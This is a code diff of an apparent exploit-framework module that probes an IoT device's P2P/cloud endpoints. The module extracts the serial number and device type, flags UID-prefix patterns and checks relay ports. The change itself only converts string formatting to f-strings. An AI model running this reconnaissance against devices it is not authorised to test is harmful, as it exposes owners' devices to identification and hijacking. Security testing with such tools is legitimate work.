@@ -55,9 +55,7 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         print_status(
-            "Probing P2P/cloud configuration on {}:{}...".format(
-                self.target, self.port
-            )
+            f"Probing P2P/cloud configuration on {self.target}:{self.port}..."
         )
 
         serial = None
@@ -68,8 +66,8 @@ class Exploit(HTTPClient):
             if resp and resp.status_code == 200 and resp.text:
                 text = resp.text.strip()
                 if len(text) > 5:
-                    print_success("Endpoint accessible: {}".format(path))
-                    print_status("  Response: {}".format(text[:200]))
+                    print_success(f"Endpoint accessible: {path}")
+                    print_status(f"  Response: {text[:200]}")
 
                     if "SerialNo" in path and "=" in text:
                         serial = text.split("=")[-1].strip()
@@ -77,23 +75,23 @@ class Exploit(HTTPClient):
                         device_type = text.split("=")[-1].strip()
 
         if serial:
-            print_success("Device Serial: {}".format(serial))
+            print_success(f"Device Serial: {serial}")
             if len(serial) > 6:
                 prefix = serial[:6]
                 print_status(
-                    "UID prefix pattern: {} — check for sequential/MAC-based generation"
-                    .format(prefix)
+                    f"UID prefix pattern: {prefix} — check for sequential/MAC-based generation"
+                    
                 )
 
         if device_type:
-            print_success("Device Type: {}".format(device_type))
+            print_success(f"Device Type: {device_type}")
 
         try:
             for p2p_port in (8800, 8900, 9000):
                 sock = socket.create_connection(
                     (self.target, p2p_port), timeout=3
                 )
-                print_success("P2P relay port {} is open".format(p2p_port))
+                print_success(f"P2P relay port {p2p_port} is open")
                 sock.close()
         except Exception:
             pass
